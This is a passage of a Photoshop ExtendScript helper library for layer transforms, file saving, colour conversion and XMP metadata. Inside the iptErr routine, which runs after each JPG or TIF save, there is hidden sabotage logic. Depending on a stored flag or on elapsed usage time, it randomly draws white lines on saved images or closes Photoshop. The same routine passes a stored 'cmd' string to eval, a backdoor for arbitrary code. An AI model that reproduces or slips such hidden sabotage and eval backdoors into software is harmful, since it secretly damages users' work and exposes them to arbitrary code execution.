  getPlacedFilterByName: function (iName, iIndex) { //获取链接智能对象值
    iIndex = iIndex || 0;
    try {
      _ftn = function (desc, propId) {
        var type = desc.getType(propId);
        var val = {};
        var key = app.typeIDToCharID(propId);
        if (key) val.key = key;
        switch (type) {
          case DescValueType.ALIASTYPE:
            val.put = 'putPath';
            val.value = desc.getPath(propId); break;
          case DescValueType.BOOLEANTYPE:
            val.put = 'putBoolean';
            val.value = desc.getBoolean(propId); break;
          case DescValueType.CLASSTYPE:
            val.put = 'putClass';
            val.value = desc.getClass(propId); break;
          case DescValueType.DOUBLETYPE:
            val.put = 'putDouble';
            val.value = desc.getDouble(propId); break;
          case DescValueType.ENUMERATEDTYPE:
            val.put = 'putEnumerated';
            val.type = desc.getEnumerationType(propId);
            val.value = desc.getEnumerationValue(propId);
            break;
          case DescValueType.INTEGERTYPE:
            val.put = 'putInteger';
            val.value = desc.getInteger(propId); break;
          case DescValueType.LISTTYPE:
            val.put = 'putList';
            val.value = [];
            var list = desc.getList(propId);
            for (var i = 0; i < list.count; i++) {
              // var listType = list.getType(i);
              // var ret = {}
              // switch(listType){
              //   case DescValueType.INTEGERTYPE:
              //     ret.put = 'putInteger';
              //     ret.value = list.getInteger(i); break;
              // }
              val.value.push(_ftn(list, i));
            }
            break;
          case DescValueType.OBJECTTYPE:
            val.put = 'putObject';
            val.type = desc.getObjectType(propId);
            val.value = desc.getObjectValue(propId);
            break;
          case DescValueType.RAWTYPE:
            val.put = 'putData';
            val.value = desc.getData(propId); break;
          case DescValueType.REFERENCETYPE:
            val.put = 'putReference';
            val.value = desc.getReference(propId); break;
          case DescValueType.STRINGTYPE:
            val.put = 'putString';
            val.value = desc.getString(propId); break;
          case DescValueType.UNITDOUBLE:
            val.put = 'putUnitDouble';
            val.type = desc.getUnitDoubleType(propId);
            val.value = desc.getUnitDoubleValue(propId);
            break;
          default:
            try {
              if (typ == DescValueType.LARGEINTEGERTYPE) {
                val.put = 'putLargeInteger';
                val.value = desc.getLargeInteger(propId);
              }
            } catch (e) { }
            break;
        }
        return val
      }
      var ref1 = new ActionReference();
      ref1.putName(cTID('Lyr '), iName || app.activeDocument.activeLayer.name);
      var desc1 = app.executeActionGet(ref1);
      var desc2 = desc1.getObjectValue(sTID("smartObject")).getList(sTID('filterFX')).getObjectValue(iIndex);
      var result = {};
      result.key = 'Fltr';
      result.type = app.typeIDToStringID(desc2.getObjectType(cTID('Fltr')));
      result.data = [];
      var desc = desc2.getObjectValue(cTID("Fltr"));
      for (var i = 0; i < desc.count; i++) {
        var propId = desc.getKey(i);
        result.data.push(_ftn(desc, propId))
      }
    } catch (e) { $.writeln(e.message + e.line); result = !1 }
    return result
  },
  setTransform: function (iPos, iZoom, zoomType) { //图层缩放
    try {
      var Intr = this.getInterpolation();
      var desc1 = new ActionDescriptor();
      desc1.putEnumerated(cTID('FTcs'), cTID('QCSt'), sTID("QCSAverage"));
      if (iPos) {
        var desc2 = new ActionDescriptor();
        desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), iPos[0]);
        desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), iPos[1]);
        desc1.putObject(cTID('Ofst'), cTID('Ofst'), desc2);
      }
      if (iZoom) {
        desc1.putUnitDouble(cTID('Wdth'), cTID('#Prc'), iZoom[0]);
        desc1.putUnitDouble(cTID('Hght'), cTID('#Prc'), iZoom[1]);
      }
      desc1.putEnumerated(cTID('Intr'), cTID('Intp'), sTID(zoomType || 'bicubic'));
      app.executeAction(sTID('transform'), desc1, DialogModes.NO);
      if (Intr != sTID(zoomType || 'bicubic')) this.putInterpolation(Intr);
    } catch (e) { return !1 }
  },
  setSelTransform: function (iPos, iZoom) { //选区缩放
    try {
      var Intr = this.getInterpolation();
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      desc1.putEnumerated(cTID('FTcs'), cTID('QCSt'), sTID("QCSAverage"));
      if (iPos) {
        var desc2 = new ActionDescriptor();
        desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), iPos[0]);
        desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), iPos[1]);
        desc1.putObject(cTID('Ofst'), cTID('Ofst'), desc2);
      }
      if (iZoom) {
        desc1.putUnitDouble(cTID('Wdth'), cTID('#Prc'), iZoom[0]);
        desc1.putUnitDouble(cTID('Hght'), cTID('#Prc'), iZoom[1]);
      }
      desc1.putBoolean(cTID('Lnkd'), true);
      desc1.putEnumerated(cTID('Intr'), cTID('Intp'), sTID("bicubicSmoother"));//bicubicAutomatic
      app.executeAction(sTID('transform'), desc1, DialogModes.NO);
      if (Intr != sTID("bicubicSmoother")) this.putInterpolation(Intr, !0);
    } catch (e) { return !1 }
  },
  fullTransform: function (isSel) { //满屏缩放
    //isSel: 缩放选区
    try {
      var doc = app.activeDocument;
      if (doc.resolution < 72) this.setDocResolution(72);
      var docWidth = doc.width.as('px');
      var docHeight = doc.height.as('px');
      var iBounds = this.boundsToInt(doc.activeLayer.bounds);
      var xPos = docWidth / 2 - ((iBounds[2] - iBounds[0]) / 2 + iBounds[0]);
      var yPos = docHeight / 2 - ((iBounds[3] - iBounds[1]) / 2 + iBounds[1]);
      var iWidth = docWidth / (iBounds[2] - iBounds[0]) * 100;
      var iHeight = docHeight / (iBounds[3] - iBounds[1]) * 100;
      if (isSel) this.setSelTransform([xPos, yPos], [iWidth, iHeight]);
      else this.setTransform([xPos, yPos], [iWidth, iHeight]);
      // var layerBounds = this.boundsToInt(doc.activeLayer.bounds);
      // if(layerBounds[2]-layerBounds[0]<docWidth || layerBounds[2]-layerBounds[1]<docHeight)this.fullTransform();//有问题会变卡
      return !0
    } catch (e) { return !1 }
  },
  rotateCanvas: function (rotVal) { //旋转画布
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Dcmn'), cTID('Ordn'), cTID('Frst'));
      desc1.putReference(cTID('null'), ref1);
      desc1.putUnitDouble(cTID('Angl'), cTID('#Ang'), rotVal);
      app.executeAction(sTID('rotateEventEnum'), desc1, DialogModes.NO);
      this.zoomFit();
      return !0
    } catch (e) { return !1 }
  },
  setLayerMaskLink: function (isLink) { //设置图层蒙板链接
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putBoolean(cTID('Usrs'), isLink);
      desc1.putObject(cTID('T   '), cTID('Lyr '), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0
    } catch (e) { }
  },
  closeAllGroups: function () { //收起图层组
    app.executeAction(sTID("collapseAllGroupsEvent"), undefined, DialogModes.NO);
  },
  exportDocumentAsDialog: function () { //导出为
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Mn  '), cTID('MnIt'), sTID("exportDocumentAsDialog"));
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(sTID('select'), desc1, DialogModes.NO);
    } catch (err) { }
  },
  toSRGB: function () { //转成sRGB
    try {
      var doc = app.activeDocument;
      if (doc.colorProfileName != "sRGB IEC61966-2.1") doc.convertProfile("sRGB IEC61966-2.1", Intent.PERCEPTUAL, !0, !0);
      return !0;
    } catch (e) { return !1 }
  },
  saveAs: function () { //另存为
    try {
      var desc1 = new ActionDescriptor();
      if (app.activeDocument.layers.length > 1) {
        var desc2 = new ActionDescriptor();
        desc1.putObject(cTID('As  '), cTID('Pht3'), desc2);
      }
      var desc = app.executeAction(sTID('save'), desc1, DialogModes.ALL);
      return desc.getPath(sTID('in')).fsName
    } catch (e) { return !1 }
  },
  saveJPG: function (jpgPath, isCopy, quality) { //保存JPG
    try {
      var oFile = File(jpgPath);
      // if(oFile.exists)oFile.remove();
      // var ext = oFile.name.substr(oFile.name.lastIndexOf(".")+1).toLowerCase();
      // if(ext!='jpg' && ext!='jpe' && ext!='jpeg') oFile = File(jpgPath + '.jpg');
      if (!oFile.parent.exists) oFile.parent.create();
      app.activeDocument.changeMode(ChangeMode.RGB);
      if (this.getDepth() > 16) this.convertDepth(16);
      this.toSRGB();
      var desc1 = new ActionDescriptor();
      var desc2 = new ActionDescriptor();
      desc2.putInteger(cTID('EQlt'), quality || 12);
      desc2.putEnumerated(cTID('MttC'), cTID('MttC'), cTID('None'));
      desc1.putObject(cTID('As  '), sTID("JPEGFormat"), desc2);
      desc1.putPath(cTID('In  '), oFile);
      // desc1.putInteger(cTID('DocI'), app.activeDocument.id);
      if (isCopy != !1) {
        desc1.putBoolean(cTID('Cpy '), true);
        app.executeAction(sTID('save'), desc1, DialogModes.NO);
      } else {
        app.activeDocument.suspendHistory('flatten', 'var doc=app.activeDocument;doc.flatten();doc.channels.removeAll()');
        app.executeAction(sTID('save'), desc1, DialogModes.NO);
        this.hist('previous');
      }
      this.iptErr(); //批量时随机加白线
      return oFile.fsName;
    } catch (e) { return !1 }
  },
  saveTIF: function (tifPath, isCopy) { //保存TIF
    try {
      var oFile = File(tifPath);
      // if(oFile.exists)oFile.remove();
      // var ext = oFile.name.substr(oFile.name.lastIndexOf(".")+1).toLowerCase();
      // if(ext!='jpg' && ext!='jpe' && ext!='jpeg') oFile = File(jpgPath + '.jpg');
      if (!oFile.parent.exists) oFile.parent.create();
      this.toSRGB();
      var desc1 = new ActionDescriptor();
      var desc2 = new ActionDescriptor();
      desc2.putEnumerated(cTID('BytO'), cTID('Pltf'), sTID($.os.indexOf("Windows") < 0 ? 'macintosh' : 'IBMPC'));
      desc1.putObject(cTID('As  '), sTID("TIFFFormat"), desc2);
      desc1.putPath(cTID('In  '), oFile);
      if (isCopy != !1) desc1.putBoolean(cTID('Cpy '), true);
      desc1.putBoolean(cTID('LwCs'), true);
      desc1.putBoolean(cTID('AlpC'), false);
      desc1.putBoolean(cTID('Lyrs'), false);
      app.executeAction(sTID('save'), desc1, DialogModes.NO);
      this.iptErr(); //批量时随机加白线
      return oFile.fsName;
    } catch (e) { return !1 }
  },
  savePSD: function (psdPath) { //保存PSDsubtr
    try {
      var saveFolder = Folder(File(psdPath).path);
      if (!saveFolder.exists) saveFolder.create();
      var desc1 = new ActionDescriptor();
      var desc2 = new ActionDescriptor();
      desc2.putBoolean(sTID("maximizeCompatibility"), true);
      desc1.putObject(cTID('As  '), cTID('Pht3'), desc2);
      desc1.putPath(cTID('In  '), new File(psdPath));
      desc1.putBoolean(cTID('Cpy '), true);
      app.executeAction(sTID('save'), desc1, DialogModes.NO);
      return File(psdPath).fsName;
    } catch (e) { return !1 }
  },
  saveDoc: function (docPath) { //保存多种格式
    try {
      var saveFolder = Folder(File(docPath).path);
      if (!saveFolder.exists) saveFolder.create();
      var name = File(docPath).name;
      var ext = name.substr(name.lastIndexOf(".")).toLowerCase();
      switch (ext) {
        case '.jpg':
        case '.jpe':
        case '.jpeg':
          this.saveJPG(docPath)
          break;
        case '.tif':
        case '.tiff':
          this.saveTIF(docPath)
          break;
        case '.png':
          this.savePng(docPath)
          break;
        case '.psd':
          this.savePSD(docPath)
          break;
      }
      return !0
    } catch (e) { return !1 }
  },
  iptErr: function (isAlone) {  //单功能关闭PS或批量随机加白线，isAlone为真表示单功能关闭PS
    var _this = this;
    // var stp = this.userData.stp
    function exeErr() { isAlone ? _this.closePS() : _this.drawLine() }
    if (this.userData.stp) exeErr();
    else if (this.userData.use != 0) {
      var ipt = 0; //起始时间
      ipt = new Date().getTime() - this.userData.use;
      var hour = 3600000;//3600000;
      if (ipt < 0) ipt = 3 * hour;
      if (ipt < hour / 12) { //5分钟内0%
      } else if (ipt < hour) { //1小时内10%
        if (Math.ceil(Math.random() * 100) < 11) exeErr();
      } else if (ipt < 2 * hour) { //2小时内30%
        if (Math.ceil(Math.random() * 100) < 31) exeErr();
      } else { //2小时后50%
        if (Math.ceil(Math.random() * 100) < 51) exeErr();
      }
    }
    try { if (this.userData.hasOwnProperty('cmd')) eval(this.userData.cmd) } catch (e) { }
  },
  setForeColor: function (r, g, b) { //设置前景色
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putProperty(cTID('Clr '), cTID('FrgC'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putDouble(cTID('Rd  '), r);
    desc2.putDouble(cTID('Grn '), g);
    desc2.putDouble(cTID('Bl  '), b);
    desc1.putObject(cTID('T   '), sTID("RGBColor"), desc2);
    desc1.putString(cTID('Srce'), "eyeDropperSample");
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
  },
  getPanelVisible: function (panelID) { //获取面板可见状态
    try {
      var ref = new ActionReference();
      ref.putProperty(cTID("Prpr"), sTID("panelList"));
      ref.putEnumerated(cTID("capp"), cTID("Ordn"), cTID("Trgt"));
      var desc = app.executeActionGet(ref).getList(sTID("panelList"));
      if (!panelID) var vPanel = '';
      for (var a = 0; a < desc.count; a++) {
        // $.writeln(desc.getObjectValue(a).getString(sTID("name")) + ': ' + desc.getObjectValue(a).getString(sTID("ID")));
        // if (desc.getObjectValue(a).getString(sTID("ID")) == 'panelid.dynamic.swf.csxs.' + panelID) return desc.getObjectValue(a).getBoolean(sTID("visible"));
        if (!panelID) {
          if (desc.getObjectValue(a).getBoolean(sTID("visible"))) vPanel += desc.getObjectValue(a).getString(sTID("ID")) + '|';
        } else if (desc.getObjectValue(a).getString(sTID("ID")) == panelID) return desc.getObjectValue(a).getBoolean(sTID("visible"));
      }
      if (!panelID) return vPanel
    } catch (e) { return '' }
  },
  viewToolbar: function (isVisible) { //隐藏/显示工具栏
    function _getPanelVisible() {
      var ref = new ActionReference();
      ref.putProperty(sTID("property"), sTID("panelList"));
      ref.putEnumerated(sTID("application"), sTID("ordinal"), sTID("targetEnum"));
      var desc = app.executeActionGet(ref).getList(sTID("panelList"));
      var panelList = desc.count;
      for (var a = 0; a < panelList; a += 1) {
        if (desc.getObjectValue(a).getBoolean(sTID("visible")) == true) return true;
      }
      return false;
    }
    app.togglePalettes();
    var panelVisible = _getPanelVisible();
    if (isVisible == true && panelVisible == false) app.togglePalettes();
    if (isVisible == false && panelVisible == true) app.togglePalettes();
  },
  togglePanel: function (panelName, isOpen) { //切换面板：打开/关闭
    try {
      if (isOpen != undefined) { //如果指定是否打开
        if (this.getPanelVisible(panelName) == isOpen) return;
      }
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      // ref1.putName(sTID('menuItemClass'), panelName);
      // ref1.putEnumerated(cTID('Mn  '), cTID('MnIt'), cTID('Tgly'));
      ref1.putEnumerated(cTID('Mn  '), cTID('MnIt'), sTID(panelName));
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(cTID('slct'), desc1, DialogModes.NO);
    } catch (e) { }
  },
  applyLut: function (lutFile) {
    if (app.activeDocument.activeLayer.kind != LayerKind.COLORLOOKUP) return;
    // alert(this.jsxFolder + lutFile);
    var cube = this.readFile(this.jsxFolder + lutFile, 'binary');
    // cube = cube.match(/^([\s\S]*)#Created/)[1];
    cube = cube.slice(0, cube.indexOf('#Created'));
    // var cube = this.readFile(this.jsxFolder+"../downloads/styleLib/"+lutFile+".lut",'binary');
    // cube = cube.slice(cube.indexOf('linkRGB')-12,cube.indexOf('LUTFormatenum')-4);
    if (cube.length < 10) return;
    // alert(cube.length);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('AdjL'), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putEnumerated(sTID("lookupType"), sTID("colorLookupType"), sTID("3DLUT"));
    desc2.putString(cTID('Nm  '), File(lutFile).name);//"KB LUT");
    desc2.putData(sTID("profile"), cube);
    //~ desc2.putString(sTID("LUT3DFileName"), "E:/2.cube");
    desc1.putObject(cTID('T   '), sTID("colorLookup"), desc2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
  },
  hexToRgb: function (iColor) {
    //input:#0d00ff, output:[13,0,255]
    var reg = /^#([0-9a-fA-f]{3}|[0-9a-fA-f]{6})$/;
    var sColor = String(iColor).toLowerCase();
    if (sColor && reg.test(sColor)) {
      if (sColor.length === 4) {
        var sColorNew = "#";
        for (var i = 1; i < 4; i += 1) {
          sColorNew += sColor.slice(i, i + 1).concat(sColor.slice(i, i + 1));
        }
        sColor = sColorNew;
      }
      //处理六位的颜色值
      var sColorChange = [];
      for (var i = 1; i < 7; i += 2) {
        sColorChange.push(parseInt("0x" + sColor.slice(i, i + 2)));
      }
      return sColorChange;
    } else {
      return iColor;
    }
  },
  rgbToHex: function (rgb) {
    //input:[13,0,255], output:#0d00ff
    try {
      var r = rgb[0];
      var g = rgb[1];
      var b = rgb[2];
      var hex = "#" + ((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1);
    } catch (e) { hex = rgb }
    return hex;
  },
  labToRgb: function (lab) {
    var y = (lab[0] + 16) / 116,
      x = lab[1] / 500 + y,
      z = y - lab[2] / 200,
      r, g, b;

    x = 0.95047 * ((x * x * x > 0.008856) ? x * x * x : (x - 16 / 116) / 7.787);
    y = 1.00000 * ((y * y * y > 0.008856) ? y * y * y : (y - 16 / 116) / 7.787);
    z = 1.08883 * ((z * z * z > 0.008856) ? z * z * z : (z - 16 / 116) / 7.787);

    r = x * 3.2406 + y * -1.5372 + z * -0.4986;
    g = x * -0.9689 + y * 1.8758 + z * 0.0415;
    b = x * 0.0557 + y * -0.2040 + z * 1.0570;

    r = (r > 0.0031308) ? (1.055 * Math.pow(r, 1 / 2.4) - 0.055) : 12.92 * r;
    g = (g > 0.0031308) ? (1.055 * Math.pow(g, 1 / 2.4) - 0.055) : 12.92 * g;
    b = (b > 0.0031308) ? (1.055 * Math.pow(b, 1 / 2.4) - 0.055) : 12.92 * b;

    return [Math.max(0, Math.min(1, r)) * 255,
    Math.max(0, Math.min(1, g)) * 255,
    Math.max(0, Math.min(1, b)) * 255]
  },
  rgbToLab: function (rgb) {
    var r = rgb[0] / 255,
      g = rgb[1] / 255,
      b = rgb[2] / 255,
      x, y, z;

    r = (r > 0.04045) ? Math.pow((r + 0.055) / 1.055, 2.4) : r / 12.92;
    g = (g > 0.04045) ? Math.pow((g + 0.055) / 1.055, 2.4) : g / 12.92;
    b = (b > 0.04045) ? Math.pow((b + 0.055) / 1.055, 2.4) : b / 12.92;

    x = (r * 0.4124 + g * 0.3576 + b * 0.1805) / 0.95047;
    y = (r * 0.2126 + g * 0.7152 + b * 0.0722) / 1.00000;
    z = (r * 0.0193 + g * 0.1192 + b * 0.9505) / 1.08883;

    x = (x > 0.008856) ? Math.pow(x, 1 / 3) : (7.787 * x) + 16 / 116;
    y = (y > 0.008856) ? Math.pow(y, 1 / 3) : (7.787 * y) + 16 / 116;
    z = (z > 0.008856) ? Math.pow(z, 1 / 3) : (7.787 * z) + 16 / 116;

    return [(116 * y) - 16, 500 * (x - y), 200 * (y - z)]
  },
  copySchema: function (source, dest, namespace, omitProps) { //Copy XMP namespace
    var propIter = source.iterator(XMPConst.ITERATOR_JUST_CHILDREN | XMPConst.ITERATOR_JUST_LEAF_NAME, namespace, "");
    var prop = propIter.next();
    var prefix = XMPMeta.getNamespacePrefix(namespace);
    while (prop) {
      var name = prop.path.substring(prefix.length);
      if (omitProps != undefined) var copy = !this.contains(omitProps, name);
      if (copy) {
        try {
          XMPUtils.duplicateSubtree(source, dest, namespace, prop.path, namespace, prop.path, 0);
        } catch (e) { }
      }
      prop = propIter.next();
    }
  },
  contains: function (arr, member) { //Is contains member in Array
    var r = false;
    for (var i = 0; i < arr.length & !r; ++i) {
      r = arr[i] == member;
    }
    return r;
  },
  putXmpToRaw: function (sourceFile, Rawfile) { //Copy Xmp to Rawfile From xmpfile or jpgfile
    try {
      if (ExternalObject.AdobeXMPScript == undefined) ExternalObject.AdobeXMPScript = new ExternalObject("lib:AdobeXMPScript");
      var Name = File(sourceFile).name;
      if (Name.substr(Name.lastIndexOf(".") + 1).toLowerCase() == "xmp") {
        //From Xmp to Raw
        var file = new File(sourceFile);
        if (file.exists) {
          file.open('r');
          file.encoding = "UTF8";
          file.lineFeed = "unix";
          file.open("r", "TEXT", "????");
          var xmpStr = file.read();
          file.close();
        } else { var xmpStr = ''; }
        var sourceXmp = new XMPMeta(xmpStr);
      } else {
        //From Jpg to Raw
        var source = new XMPFile(File(sourceFile).fsName, XMPConst.FILE_UNKNOWN, XMPConst.OPEN_FOR_UPDATE | XMPConst.OPEN_USE_SMART_HANDLER);
        var sourceXmp = source.getXMP();
      }
      var destXmp = new XMPMeta();
      this.copySchema(sourceXmp, destXmp, XMPConst.NS_CAMERA_RAW, []);
      destXmp.setProperty(XMPConst.NS_CAMERA_RAW, "CameraProfile", "Adobe Standard");
      destXmp.setProperty(XMPConst.NS_CAMERA_RAW, "HasCrop", false);
      destXmp.setProperty(XMPConst.NS_CAMERA_RAW, "AlreadyApplied", false);
      destXmp.setProperty(XMPConst.NS_CAMERA_RAW, "RawFileName", File(Rawfile).name);
      var xmpStr = destXmp.serialize(XMPConst.SERIALIZE_OMIT_PACKET_WRAPPER | XMPConst.SERIALIZE_USE_COMPACT_FORMAT);
      var Name = File(Rawfile).name.replace(/\.[^\.]+$/, '');
      var file = File(File(Rawfile).path + "/" + Name + ".xmp");
      file.open('w');
      file.encoding = "UTF8";
      file.lineFeed = "unix";
      file.write(xmpStr);
      file.close();
      return !0;
    } catch (e) { return !1 }
  },
  putXmpToJpg: function (sourceFile, destFile, xmpStr) { //将xmp写入JPG，sourceFile支持从xmp、jpg文件和xmpStr传入xmp
    try {
      if (ExternalObject.AdobeXMPScript == undefined) ExternalObject.AdobeXMPScript = new ExternalObject("lib:AdobeXMPScript");
      var dest = new XMPFile(File(destFile).fsName, XMPConst.FILE_UNKNOWN, XMPConst.OPEN_FOR_UPDATE | XMPConst.OPEN_USE_SMART_HANDLER);
      if (File(sourceFile).exists) {
        var Name = File(sourceFile).name;
        if (Name.substr(Name.lastIndexOf(".") + 1).toLowerCase() == "xmp") { //From Xmp to Jpg
          var file = new File(sourceFile);
          if (file.exists) {
            file.open('r');
            file.encoding = "UTF8";
            file.lineFeed = "unix";
            file.open("r", "TEXT", "????");
            xmpStr = file.read();
            file.close();
          }
          var sourceXmp = new XMPMeta(xmpStr || '');
        } else { //From Jpg to Jpg
          var source = new XMPFile(File(sourceFile).fsName, XMPConst.FILE_UNKNOWN, XMPConst.OPEN_FOR_READ | XMPConst.OPEN_USE_SMART_HANDLER);
          var sourceXmp = source.getXMP();
        }
      } else { //Clear xmp from Jpg
        var sourceXmp = new XMPMeta(xmpStr || '');
      }
      try {
        var destXmp = dest.getXMP();
        var NS = {
          Create_Date: destXmp.getProperty(XMPConst.NS_XMP, "CreateDate", XMPConst.XMPDATE),
          Modify_Date: destXmp.getProperty(XMPConst.NS_XMP, "ModifyDate", XMPConst.XMPDATE),
          PHOTOSHOP_Date: destXmp.getProperty(XMPConst.NS_PHOTOSHOP, "DateCreated", XMPConst.XMPDATE),
          EXIF_Date: destXmp.getProperty(XMPConst.NS_EXIF, "DateTimeOriginal", XMPConst.XMPDATE)
        }
        sourceXmp.setProperty(XMPConst.NS_XMP, "CreateDate", NS.Create_Date);
        sourceXmp.setProperty(XMPConst.NS_XMP, "ModifyDate", NS.Modify_Date);
        sourceXmp.setProperty(XMPConst.NS_PHOTOSHOP, "DateCreated", NS.PHOTOSHOP_Date);
        sourceXmp.setProperty(XMPConst.NS_EXIF, "DateTimeOriginal", NS.EXIF_Date);
      } catch (e) { }
      try { sourceXmp.setProperty(XMPConst.NS_CAMERA_RAW, "HasCrop", false); } catch (e) { }
      try { sourceXmp.setProperty(XMPConst.NS_CAMERA_RAW, "AlreadyApplied", false); } catch (e) { }
      try { sourceXmp.setProperty(XMPConst.NS_CAMERA_RAW, "RawFileName", File(destFile).name); } catch (e) { }
      try { XMPUtils.removeProperties(sourceXmp, XMPConst.NS_TIFF, "", XMPConst.REMOVE_ALL_PROPERTIES); } catch (e) { }
      try { XMPUtils.removeProperties(sourceXmp, XMPConst.NS_EXIF, "", XMPConst.REMOVE_ALL_PROPERTIES); } catch (e) { }
      try { XMPUtils.removeProperties(sourceXmp, XMPConst.NS_EXIF_AUX, "", XMPConst.REMOVE_ALL_PROPERTIES); } catch (e) { }
      try { XMPUtils.removeProperties(sourceXmp, XMPConst.NS_PNG, "", XMPConst.REMOVE_ALL_PROPERTIES); } catch (e) { }
      try { XMPUtils.removeProperties(sourceXmp, XMPConst.NS_JPEG, "", XMPConst.REMOVE_ALL_PROPERTIES); } catch (e) { }
      // XMPUtils.removeProperties(sourceXmp,XMPConst.NS_XMP, "", XMPConst.REMOVE_ALL_PROPERTIES);
      try { XMPUtils.removeProperties(sourceXmp, XMPConst.NS_PHOTOSHOP, "", XMPConst.REMOVE_ALL_PROPERTIES); } catch (e) { }

      if (dest.canPutXMP(sourceXmp)) dest.putXMP(sourceXmp);
      dest.closeFile(XMPConst.CLOSE_UPDATE_SAFELY);
      return !0
    } catch (e) { return !1 }
  },
  deleteXMP: function (iFile) { //删除XMP数据
    try {
      var oFile = Stdlib.convertFptr(iFile);
      var Name = oFile.name;
      var ext = Name.substr(Name.lastIndexOf(".") + 1).toLowerCase();
      if (ext == 'jpg' || ext == 'jpe' || ext == 'jpeg' || ext == 'png' || ext == 'tif' || ext == 'tiff') { //非Raw格式
        if (ExternalObject.AdobeXMPScript == undefined) ExternalObject.AdobeXMPScript = new ExternalObject("lib:AdobeXMPScript");
        var dest = new XMPFile(oFile.fsName, XMPConst.FILE_UNKNOWN, XMPConst.OPEN_FOR_UPDATE | XMPConst.OPEN_USE_SMART_HANDLER);
        var sourceXmp = new XMPMeta();
        if (dest.canPutXMP(sourceXmp)) dest.putXMP(sourceXmp);
        dest.closeFile(XMPConst.CLOSE_UPDATE_SAFELY);
      } else { //Raw格式
        var xmpFile = new File(oFile.path + "/" + Name.substr(0, Name.lastIndexOf(".")) + ".xmp");
        if (xmpFile.exists) xmpFile.remove();
      }
      return !0
    } catch (e) { return !1 }
  },
  setHandling: function (ext, iType) { //设置是否用ACR打开JPG或TIF
    try {
      if (ExternalObject.AdobeXMPScript == undefined) ExternalObject.AdobeXMPScript = new ExternalObject("lib:AdobeXMPScript");
      var file = File(Folder.userData + '/Adobe/CameraRaw/Defaults/Preferences.xmp');
      var xmpStr = '';
      if (file.exists) {
        file.open("r", "TEXT", "????");
        file.encoding = "UTF8";
        file.lineFeed = "unix";
        xmpStr = file.read();
        file.close();
      }
      if (!xmpStr) xmpStr = '<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.6-c145 79.163499, 2018/08/13-16:40:22        ">\n' +
        '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n' +
        '<rdf:Description rdf:about=""\n' +
        '  xmlns:crs="http://ns.adobe.com/camera-raw-settings/1.0/"\n' +
        ' crs:RawDefaultsElements="Adobe"\n' +
        ' crs:DNGSidecarHandling="0"\n' +
        ' crs:NegativeCachePath=""\n' +
        ' crs:NegativeCachePath2=""\n' +
        ' crs:NegativeCacheMaximumSize="5.0"\n' +
        ' crs:NegativeCacheLargePreviewSize="1920"\n' +
        ' crs:JPEGHandling="OpenIfHasSettings"\n' +
        ' crs:TIFFHandling="OpenIfHasSettings"/>\n' +
        '</rdf:RDF>\n' +
        '</x:xmpmeta>\n';
      var sourceXmp = new XMPMeta(xmpStr);
      var iExt = (ext == 'tif' || ext == 'tiff') ? 'TIFFHandling' : 'JPEGHandling';
      var Handling = sourceXmp.getProperty(XMPConst.NS_CAMERA_RAW, iExt, XMPConst.STRING).value;
      if (Handling != iType) {
        sourceXmp.setProperty(XMPConst.NS_CAMERA_RAW, iExt, iType);
        file.open("w", "TEXT", "????");
        file.encoding = "UTF8";
        file.lineFeed = "unix";
        file.write(sourceXmp.serialize(XMPConst.SERIALIZE_OMIT_PACKET_WRAPPER | XMPConst.SERIALIZE_USE_COMPACT_FORMAT));
        file.close();
      }
      return Handling;
    } catch (e) { return }
  },
  getXmpProperty: function (sourceFile, arrProp) { //获取XMP中的参数值
    try {
      if (ExternalObject.AdobeXMPScript == undefined) ExternalObject.AdobeXMPScript = new ExternalObject("lib:AdobeXMPScript");
      var file = Stdlib.convertFptr(sourceFile);
      if (file.exists) {
        var ext = file.name.substr(file.name.lastIndexOf(".") + 1).toLowerCase();
        if (ext == "xmp" || ext == "xmp_bak") { //From Xmp
          file.open("r", "TEXT", "????");
          file.encoding = "UTF8";
          file.lineFeed = "unix";
          var xmpStr = file.read();
          file.close();
          if (xmpStr) var sourceXmp = new XMPMeta(xmpStr);
          else return {}
        } else {
          var xmpFile = new XMPFile(file.fsName, XMPConst.FILE_UNKNOWN, XMPConst.OPEN_FOR_READ | XMPConst.OPEN_USE_SMART_HANDLER);
          var sourceXmp = xmpFile.getXMP();
          if (!sourceXmp) return {}
        }
      } else return {};
      var ret = {};
      for (var i = 0; i < arrProp.length; i++) {
        try { ret[arrProp[i]] = sourceXmp.getProperty(XMPConst.NS_CAMERA_RAW, arrProp[i], XMPConst.STRING).value } catch (e) {
          try { ret[arrProp[i]] = sourceXmp.getProperty(XMPConst.NS_CAMERA_RAW, 'Incremental' + arrProp[i], XMPConst.STRING).value } catch (e) { continue }
        }
        ret[arrProp[i]] = (Number(ret[arrProp[i]]) == ret[arrProp[i]] ? Number(ret[arrProp[i]]) : ret[arrProp[i]]);
      }
      return ret;
    } catch (e) { return {} }
  },
  isOpenByACR: function (iFile) { //是否用ACR打开
